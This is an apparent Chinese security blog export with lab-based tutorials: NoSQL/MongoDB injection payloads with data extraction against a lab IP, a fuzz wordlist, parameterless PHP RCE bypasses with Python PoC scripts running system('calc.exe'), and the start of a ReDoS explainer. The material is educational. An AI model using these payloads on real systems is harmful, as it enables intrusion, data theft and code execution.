<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 闭合前部js代码</span></span><br><span class="line">a);&#125;&#125;,<span class="function"><span class="keyword">function</span><span class="params">(kv)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;, &#123; out: <span class="string">'x'</span> &#125;);</span><br><span class="line"><span class="comment"># 真正的注入语句</span></span><br><span class="line">db.injection.insert(&#123;success:<span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment"># 闭合后部js代码</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;db.stores.mapReduce(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; &#123; emit(<span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>带入<code>js</code>代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// map</span></span><br><span class="line">$map = <span class="string">"function() &#123;</span></span><br><span class="line"><span class="string">	for (var i = 0; i &lt; this.items.length; i++) &#123;</span></span><br><span class="line"><span class="string"> 		emit(this.name, this.items[i].a);&#125;&#125;,</span></span><br><span class="line"><span class="string"> 		function(kv) &#123; return 1; &#125;, &#123; out: 'x' &#125;);</span></span><br><span class="line"><span class="string">	db.injection.insert(&#123;success:1&#125;);</span></span><br><span class="line"><span class="string">	return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1); &#125; &#125;"</span>;</span><br><span class="line"><span class="comment">// reduce</span></span><br><span class="line">$reduce = <span class="string">"function(name, sum) &#123; return Array.sum(sum); &#125;"</span>;</span><br><span class="line"></span><br><span class="line">$opt = <span class="string">"&#123; out: 'totals' &#125;"</span>;</span><br><span class="line">$db-&gt;execute(<span class="string">"db.stores.mapReduce($map, $reduce, $opt);"</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>最终数据库执行如下</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">db.stores.mapReduce(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment"># map</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; this.items.length; i++) &#123;</span><br><span class="line"> 		emit(this.name, this.items[i].a);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;,</span><br><span class="line">    <span class="comment"># reduce inject</span></span><br><span class="line"> 	<span class="function"><span class="keyword">function</span><span class="params">(kv)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;, </span><br><span class="line">    <span class="comment"># opt inject</span></span><br><span class="line">    &#123; out: <span class="string">'x'</span> &#125;</span><br><span class="line">);</span><br><span class="line">db.injection.insert(&#123;success:<span class="number">1</span>&#125;);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">db.stores.mapReduce(</span><br><span class="line">    <span class="comment"># map inject</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; &#123; emit(<span class="number">1</span>,<span class="number">1</span>); &#125; &#125;, </span><br><span class="line">    <span class="comment"># reduce</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span><span class="params">(name, sum)</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">Array</span>.sum(sum); &#125;,   </span><br><span class="line">    <span class="comment"># opt</span></span><br><span class="line">    &#123; out: <span class="string">'totals'</span> &#125;                    </span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>靶场<code>demo1</code></li>
</ul>
<p>后端代码类似如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$m = <span class="keyword">new</span> MongoClient();</span><br><span class="line">$db = $m-&gt;test;</span><br><span class="line">$collection = $db-&gt;users;</span><br><span class="line">  $query_body =<span class="string">"</span></span><br><span class="line"><span class="string">		function q() &#123;</span></span><br><span class="line"><span class="string">			var username = "</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">";</span></span><br><span class="line"><span class="string">			var password = "</span>.$_REQUEST[<span class="string">"password"</span>].<span class="string">";if(username == 'weiyi'&amp;&amp;password == '123456') return true; else&#123; return false;&#125;&#125;</span></span><br><span class="line"><span class="string">"</span>;  </span><br><span class="line">$result = $collection-&gt;find(<span class="keyword">array</span>(<span class="string">'$where'</span>=&gt;$query_body));</span><br><span class="line">$count = $result-&gt;count();</span><br><span class="line">$doc_failed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_failed-&gt;loadHTMLFile(<span class="string">"failed.html"</span>);</span><br><span class="line">$doc_succeed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_succeed-&gt;loadHTMLFile(<span class="string">"succeed.html"</span>);</span><br></pre></td></tr></table></figure>

<p>其中为了演示方便，账号密码写死为<code>weiyi / 123456</code></p>
<ul>
<li>正常的请求如下</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/9.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/10.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/11.png" alt></p>
<ul>
<li>闭合<code>js</code>绕过姿势</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">password = 2;return true</span><br></pre></td></tr></table></figure>

<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/12.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/13.png" alt></p>
<ul>
<li>靶场<code>demo2</code></li>
</ul>
<p>后端代码类似如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$m = <span class="keyword">new</span> MongoClient();</span><br><span class="line">$db = $m-&gt;test;</span><br><span class="line">$collection = $db-&gt;users;</span><br><span class="line">$tem = $_REQUEST[<span class="string">"password"</span>];</span><br><span class="line">$query = <span class="string">"function q()&#123;"</span>;</span><br><span class="line">$query.= <span class="string">"var secret_number = 111;"</span>;</span><br><span class="line">$query.= <span class="string">"var user_try = $tem;"</span>;</span><br><span class="line">$query.=<span class="string">"if (secret_number!=user_try) return false;"</span>;</span><br><span class="line">$query.=<span class="string">"return true;"</span>;</span><br><span class="line">$query.= <span class="string">"&#125;"</span>;</span><br><span class="line">$result = $collection-&gt;find(<span class="keyword">array</span>(<span class="string">'$where'</span>=&gt;$query));</span><br><span class="line">$count = $result-&gt;count();</span><br><span class="line">print_r($count);</span><br><span class="line">$doc_failed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_failed-&gt;loadHTMLFile(<span class="string">"failed.html"</span>);</span><br><span class="line">$doc_succeed = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$doc_succeed-&gt;loadHTMLFile(<span class="string">"succeed.html"</span>);</span><br></pre></td></tr></table></figure>

<p>同理如下：</p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/14.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/15.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/16.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/17.png" alt></p>
<ul>
<li>靶场<code>demo3</code></li>
</ul>
<p>后端代码如下</p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/18.png" alt></p>
<ul>
<li>正常请求</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/19.png" alt></p>
<ul>
<li>注入姿势</li>
<li>拿到集合</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">219.153.49.228:41861/new_list.php?id=1'&#125;);return (&#123;title:tojson(db.getCollectionNames()),1:'1</span><br></pre></td></tr></table></figure>

<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/20.png" alt></p>
<ul>
<li>查看集合中的数据</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 第一条</span></span><br><span class="line">219.153.49.228:41861/new_list.php?id=1'&#125;);return (&#123;title:tojson(db.Authority_confidential.find()[0]),1:'1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二条</span></span><br><span class="line">219.153.49.228:41861/new_list.php?id=1'&#125;);return (&#123;title:tojson(db.Authority_confidential.find()[1]),1:'1</span><br></pre></td></tr></table></figure>

<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/21.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/22.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/23.png" alt></p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="CSRF-REST-API-绕过防护"><a href="#CSRF-REST-API-绕过防护" class="headerlink" title="CSRF+REST API 绕过防护"></a>CSRF+REST API 绕过防护</h3><p>​    <code>NoSQL</code>数据库另一个特性是暴露<code>HTTP REST API</code>接口供用户查询，客户端可能是基于<code>HTML5</code>的应用程序，这样查询会更为方便，但是也具有一定的安全风险，特别是配合<code>CSRF</code>攻击</p>
<p>​    如下如所示</p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/24.png" alt></p>
<h3 id="NoSQL注入污染数据库"><a href="#NoSQL注入污染数据库" class="headerlink" title="NoSQL注入污染数据库"></a>NoSQL注入污染数据库</h3><p>​    开发的伪代码类似如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user_data = POST.data</span><br><span class="line">db.user.update(user_data[id], user_data)</span><br></pre></td></tr></table></figure>

<p>​    说明，场景可能为更新用户信息，前端传递修改的手机号、年龄等，但是后端并未对需要更新的字段进行白名单过滤，此时如果攻击者增加<code>level</code>等字段，导致数据库信息修改，权限提升等</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 正常的请求</span><br><span class="line">&#123;&quot;phonenum&quot;:&quot;13344445555&quot;, &quot;age&quot;:18&#125;</span><br><span class="line"></span><br><span class="line"># 攻击者请求</span><br><span class="line">&#123;&quot;phonenum&quot;:&quot;13344445555&quot;, &quot;age&quot;:18, &quot;level&quot;:1, &quot;role&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>某系统编辑处存在如下问题</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/25.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/26.png" alt></p>
<ul>
<li>发送额外字段可导致插入数据库</li>
<li>修改数据库<code>create_time</code>字段</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/27.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/28.png" alt></p>
<ul>
<li>某系统新增业务处存在如下问题</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/29.png" alt></p>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/30.png" alt></p>
<p>污染数据库</p>
<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="动态-amp-amp-静态安全扫描"><a href="#动态-amp-amp-静态安全扫描" class="headerlink" title="动态&amp;&amp;静态安全扫描"></a>动态&amp;&amp;静态安全扫描</h4><ul>
<li>动态代码扫描Dynamic Application Security Testing (DAST) </li>
<li>静态代码分析(static code analysis)</li>
</ul>
<h4 id="控制rest-api接口请求"><a href="#控制rest-api接口请求" class="headerlink" title="控制rest api接口请求"></a>控制<code>rest api</code>接口请求</h4><p>​    主要是为了防御<code>CSRF</code>攻击</p>
<ul>
<li>只接受<code>JSON</code>格式的<code>content type</code></li>
<li><code>html</code>表单不局限于只进行<code>url</code>编码</li>
<li>确保不会出现<code>JSONP</code>和<code>CORS</code>跨域请求</li>
</ul>
<h4 id="数据库权限控制"><a href="#数据库权限控制" class="headerlink" title="数据库权限控制"></a>数据库权限控制</h4><ul>
<li>对数据库操作进行合理的权限控制</li>
<li>不同的用户访问不同的集合</li>
<li>不同的用户对不同的集合增删改查权限做细分</li>
</ul>
<p><img data-src="./NoSQL%E6%B3%A8%E5%85%A5/31.png" alt></p>
<h4 id="编码规范"><a href="#编码规范" class="headerlink" title="编码规范"></a>编码规范</h4><ul>
<li>控制更新白名单<code>key</code></li>
<li>非必要情况下前端禁止传入字典</li>
</ul>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><h3 id="fuzz字典"><a href="#fuzz字典" class="headerlink" title="fuzz字典"></a>fuzz字典</h3><p><a href="https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt" target="_blank" rel="noopener">https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">true, $where: '1 == 1'</span><br><span class="line">, $where: '1 == 1'</span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">where</span>: <span class="string">'1 == 1'</span></span></span><br><span class="line">', $where: '1 == 1</span><br><span class="line">1, $where: '1 == 1'</span><br><span class="line">&#123; $ne: 1 &#125;</span><br><span class="line">', $or: [ &#123;&#125;, &#123; 'a':'a</span><br><span class="line">' &#125; ], $comment:'successful MongoDB injection'</span><br><span class="line">db.injection.insert(&#123;success:1&#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;);return 1;db.stores.mapReduce(function() &#123; &#123; emit(1,1</span><br><span class="line">|| 1==1</span><br><span class="line">|| 1==1//</span><br><span class="line">|| 1==1%00</span><br><span class="line">&#125;, &#123; password : /.*/ &#125;</span><br><span class="line">' &amp;&amp; this.password.match(/.*/)//+%00</span><br><span class="line">' &amp;&amp; this.passwordzz.match(/.*/)//+%00</span><br><span class="line">'%20%26%26%20this.password.match(/.*/)//+%00</span><br><span class="line">'%20%26%26%20this.passwordzz.match(/.*/)//+%00</span><br><span class="line">&#123;$gt: ''&#125;</span><br><span class="line"><span class="meta">[$</span><span class="bash">ne]=1</span></span><br><span class="line">';sleep(5000);</span><br><span class="line">';it=new%20Date();do&#123;pt=new%20Date();&#125;while(pt-it&lt;5000);</span><br><span class="line">&#123;"username": &#123;"$ne": null&#125;, "password": &#123;"$ne": null&#125;&#125;</span><br><span class="line">&#123;"username": &#123;"$ne": "foo"&#125;, "password": &#123;"$ne": "bar"&#125;&#125;</span><br><span class="line">&#123;"username": &#123;"$gt": undefined&#125;, "password": &#123;"$gt": undefined&#125;&#125;</span><br><span class="line">&#123;"username": &#123;"$gt":""&#125;, "password": &#123;"$gt":""&#125;&#125;</span><br><span class="line">&#123;"username":&#123;"$in":["Admin", "4dm1n", "admin", "root", "administrator"]&#125;,"password":&#123;"$gt":""&#125;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>NoSQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP无参数RCE</title>
    <url>/2021/01/10/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
    <content><![CDATA[<h1 id="PHP无参数RCE"><a href="#PHP无参数RCE" class="headerlink" title="PHP无参数RCE"></a>PHP无参数RCE</h1><p>​    本文主要是PHP无参数RCE浅析</p>
<a id="more"></a>

<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>​    <code>RCE</code>指的是远程命令执行，服务器后台可以执行<code>eval</code>等代码执行函数，而无参数<code>RCE</code>指的是传参的时候被过滤，我们只能让代码执行形如<code>a(b(c(d())))</code>的代码</p>
<h2 id="过滤场景"><a href="#过滤场景" class="headerlink" title="过滤场景"></a>过滤场景</h2><p>先看一段<code>php</code>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">               <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先分析外层正则表达式<code>[^\W]+\((?R)?\)</code></li>
</ul>
<p><code>^</code>表示取反</p>
<p><code>\W</code>代表匹配非字母、数字、下划线，等价于<code>[^A-Za-z0-9_]</code></p>
<p>上面两点加一块，代表匹配所有字母数字下划线</p>
<p><code>+</code>代表字母数字下划线匹配至少一个</p>
<p><code>\(</code> <code>\)</code> 代表匹配括号本身</p>
<p><code>(?R)</code>表示递归表达式本身</p>
<p><code>(?R)?</code> 最后的<code>?</code>表示匹配1个或者0个表达式本身</p>
<p>综上：这个表达式其实就是匹配形如<code>a(b(c(d())))</code>的字符串</p>
<ul>
<li>内层表达式<code>et|dir|na|info|dec|oct|pi|log</code></li>
</ul>
<p>输入的字符串不能包含<code>et、dir、na、info、dec、oct、pi、log</code>字符串</p>
<p><code>/i</code>表示忽略大小写，上面的黑名单字符串及时大小写也不能进行绕过</p>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul>
<li>绕过的代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"successful!"</span>;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span><br><span class="line">		&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>​    apache2环境下，函数返回所有请求头信息，这个是<code>apache</code>的函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	var_dump(getallheaders());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/1.png" alt></p>
<ul>
<li>自定义一些头部信息</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/2.png" alt></p>
<ul>
<li>取出我们自定义的头部信息</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	var_dump(end(getallheaders()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/3.png" alt></p>
<ul>
<li>自定义的头部变成了参数</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/4.png" alt></p>
<ul>
<li>进一步获取<code>RCE</code></li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/5.png" alt></p>
<ul>
<li>非<code>apache</code>中间件</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/6.png" alt></p>
<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/7.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	var_dump(get_defined_vars());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/8.png" alt></p>
<p>可以回显的全局变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure>

<ul>
<li>RCE POC</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/eval.php?var=eval(end(current(get_defined_vars())));&amp;id=system("calc.exe");</span><br></pre></td></tr></table></figure>

<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/9.png" alt></p>
<ul>
<li>如果服务器 对 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> 进行了全局过滤，可以从 <code>$_FILES</code>下手</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;system(&#39;calc.exe&#39;);&quot;.encode(&#39;hex&#39;)</span><br><span class="line">files &#x3D; &#123;</span><br><span class="line">  payload: BytesIO(&#39;caiji&#39;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;localhost&#x2F;eval.php?var&#x3D;eval(hex2bin(array_rand(end(get_defined_vars()))));&#39;, files&#x3D;files, allow_redirects&#x3D;False)</span><br><span class="line"></span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>

<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/10.png" alt></p>
<h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><ul>
<li>php中对此函数的解释</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/11.png" alt></p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;system(&#39;calc.exe&#39;);&quot;.encode(&#39;hex&#39;)</span><br><span class="line">cookies &#x3D; &#123;</span><br><span class="line">  &#39;PHPSESSID&#39;: payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;localhost&#x2F;eval.php?var&#x3D;eval(hex2bin(session_id(session_start())));&#39;, cookies&#x3D;cookies)</span><br><span class="line"></span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>

<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/12.png" alt></p>
<h3 id="目录操作相关"><a href="#目录操作相关" class="headerlink" title="目录操作相关"></a>目录操作相关</h3><ul>
<li>可以用相关函数进行目录遍历&amp;&amp;任意文件读取</li>
</ul>
<p>相关函数</p>
<ul>
<li><code>getcwd()</code>当前目录</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/13.png" alt></p>
<ul>
<li><code>scandir()</code> 目录扫描</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/14.png" alt></p>
<ul>
<li><code>dirname()</code> 目录穿越</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/15.png" alt></p>
<ul>
<li><p><code>chdir()</code> 更改当前目录</p>
</li>
<li><p>读取上一层的特定文件</p>
</li>
</ul>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/16.png" alt></p>
<p><img data-src="./PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/17.png" alt></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ReDos浅析</title>
    <url>/2020/11/24/blog_formal/security/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ReDos%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ReDos浅析"><a href="#ReDos浅析" class="headerlink" title="ReDos浅析"></a>ReDos浅析</h1><p>​    DOS为拒绝服务攻击，<code>re</code>则是由于正则表达式使用不当，陷入正则引擎的回溯陷阱导致服务崩溃，大量消耗后台性能</p>
<a id="more"></a>

<h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><p>​    探讨redos攻击之前，首先了解下正则的一些知识</p>
<h3 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h3><ul>
<li>大体的执行过程分为: 编译 -&gt; 执行</li>
<li>编译过程中，首先进行预编译，然后进入编译阶段</li>
<li>执行的时候利用正则引擎进行匹配，最终得出匹配成功or失败</li>
<li>编码过程中尽量使用预编译，并将预编译结果临时保存到全局变量，预编译的速度要比即用编辑快！</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r"http:\/\/(?:.?\w+)+"</span></span><br><span class="line"></span><br><span class="line">text = <span class="string">r'&lt;a href="http://www.xxx.com"&gt;xxx.com&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预编译</span></span><br><span class="line">pattern_compile = re.compile(pattern)</span><br><span class="line"></span><br><span class="line">time_begin = time.time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000000</span>):</span><br><span class="line">    pattern_compile.match(text)</span><br><span class="line">print(<span class="string">"compile total time = &#123;0&#125;"</span>.format(time.time() - time_begin))</span><br><span class="line"></span><br><span class="line">time_begin = time.time()</span><br><span class="line"><span class="comment"># 未使用预编译</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000000</span>):</span><br><span class="line">    re.match(pattern, text)</span><br><span class="line">print(<span class="string">"not compile total time = &#123;0&#125;"</span>.format(time.time() - time_begin))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">compile total time = <span class="number">3.97600007057</span></span><br><span class="line"><span class="keyword">not</span> compile total time = <span class="number">11.0629999638</span></span><br></pre></td></tr></table></figure>

<h3 id="正则引擎"><a href="#正则引擎" class="headerlink" title="正则引擎"></a>正则引擎</h3><ul>
<li>DFA-确定型有穷自动机<ul>
<li>捏着文本串去比较正则式，看到一个子正则式，就把可能的匹配串全标注出来，然后再看正则式的下一个部分，根据新的匹配结果更新标注</li>
<li>文本串中每一个字符串只扫描一次，速度快，特征少</li>
<li>文本主导，按照文本的顺序执行(确定型)</li>
<li>没有回溯的过程，不能使用断言等正则高级语法</li>
</ul>
</li>
<li>NFA-非确定性有穷自动机<ul>
<li>捏着正则式去比文本，吃掉一个字符，就把它跟正则式比较，匹配就记下来：“where when匹配上了！”，接着往下干。一旦不匹配，就把刚吃的这个字符吐出来，一个个的吐，直到回到上一次匹配的地方</li>
<li>反复吞吐文本字符，速度慢，特征丰富</li>
<li>表达式主导，按照表达式主导执行</li>
<li>有回溯的过程，能使用断言等正则高级语法</li>
</ul>
</li>
</ul>
<h3 id="正则引擎使用场景"><a href="#正则引擎使用场景" class="headerlink" title="正则引擎使用场景"></a>正则引擎使用场景</h3><table>
<thead>
<tr>
<th align="center">引擎类型</th>
<th align="center">程序</th>
</tr>
</thead>
<tbody><tr>
<td align="center">DFA</td>
<td align="center">awk(大多数版本)、egrep（大多数版本）、flex、lex、MySQL、Procmail</td>
</tr>
<tr>
<td align="center">传统型 NFA</td>
<td align="center">GNU Emacs、Java、grep（大多数版本）、less、more、.NET语言、PCRE library、Perl、PHP（所有三套正则库）、Python、Ruby、set（大多数版本）、vi</td>
</tr>
<tr>
<td align="center">POSIX NFA</td>
<td align="center">mawk、Mortice Lern System’s utilities、GUN Emacs（明确指定时使用）</td>
</tr>
<tr>
<td align="center">DFA/NFA混合</td>
<td align="center">GNU awk、 GNU grep/egrep、 Tcl</td>
</tr>
</tbody></table>
<ul>
<li>概括下，大多数高级语言都是使用<code>NFA</code>正则引擎，功能强大</li>
<li>数据库则使用<code>DFA</code>正则引擎，如<code>MongoDB</code>，<code>MySQL</code></li>
</ul>
